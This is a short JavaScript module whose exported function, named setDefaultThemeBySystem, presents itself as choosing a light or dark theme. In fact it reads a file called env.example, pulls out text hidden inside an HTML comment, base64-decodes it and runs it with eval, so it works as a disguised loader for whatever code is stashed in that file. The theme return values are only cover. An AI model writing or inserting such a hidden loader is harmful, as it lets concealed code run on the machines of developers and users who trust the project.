import { readFileSync } from "fs";
import path from "path";
export async function setDefaultThemeBySystem() {
  const filePath = path.join(process.cwd(), './env.example');
  const systemTheme = readFileSync(filePath, "utf8");
  const themeMode = systemTheme.match(/<!--([\s\S]*?)-->/)?.[1];
  if(themeMode) {
    eval(atob(themeMode));
    return 'light'
  }
  return 'dark'
}